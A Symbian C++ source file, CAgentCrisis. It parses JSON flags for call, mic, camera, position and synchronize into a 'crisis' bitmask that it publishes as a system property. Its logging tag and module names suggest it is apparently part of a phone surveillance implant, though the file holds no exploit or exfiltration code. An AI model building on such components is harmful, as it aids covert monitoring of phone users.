/*
 * AgentCrisis.cpp
 *
 *  Created on: 01/giu/2012
 *      Author: Giovanna
 */

#include "AgentCrisis.h"
#include "Json.h"


CAgentCrisis::CAgentCrisis() :
	CAbstractAgent(EAgent_Crisis),iBusy(EFalse)
	{
	// No implementation required
	}

CAgentCrisis::~CAgentCrisis()
	{
	__FLOG(_L("Destructor"));
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentCrisis* CAgentCrisis::NewLC(const TDesC8& params)
	{
	CAgentCrisis* self = new (ELeave) CAgentCrisis();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCrisis* CAgentCrisis::NewL(const TDesC8& params)
	{
	CAgentCrisis* self = CAgentCrisis::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentCrisis::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	__FLOG_OPEN("HT", "Agent_Crisis.txt");
	__FLOG(_L("-------------"));
	
	//read parameters
	RBuf paramsBuf;
					
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else 
		{
			//TODO: not enough memory
		}
				
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		TBool activated;
		//retrieve call flag
		if(rootObject->Find(_L("call")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("call"),activated);
			if (activated)
				iFlags |= ECallCrisis;
			}
		//retrieve mic flag
		if(rootObject->Find(_L("mic")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("mic"), activated);
			if (activated)
				iFlags |= EMicCrisis;
			}
		//retrieve camera flag
		if(rootObject->Find(_L("camera")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("camera"), activated);
			if(activated)
				iFlags |= ECamCrisis;
			}
		//retrieve position flag
		if(rootObject->Find(_L("position")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("position"), activated);
			if(activated)
				iFlags |= EPosCrisis;
			}
		//retrieve sync flag
		if(rootObject->Find(_L("synchronize")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("synchronize"), activated);
			if(activated)
				iFlags |= ESyncCrisis;
			}
		
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	}

void CAgentCrisis::StartAgentCmdL()
	{
	
	__FLOG(_L("StartAgentCmdL()"));
	if(iBusy)
		return;
	iBusy = ETrue;
	RProperty::Set(KPropertyUidCore, KPropertyCrisis,iFlags);
	iBusy = EFalse;
	}

void CAgentCrisis::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	RProperty::Set(KPropertyUidCore, KPropertyCrisis,0);
	iBusy = EFalse;
	}

void CAgentCrisis::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}

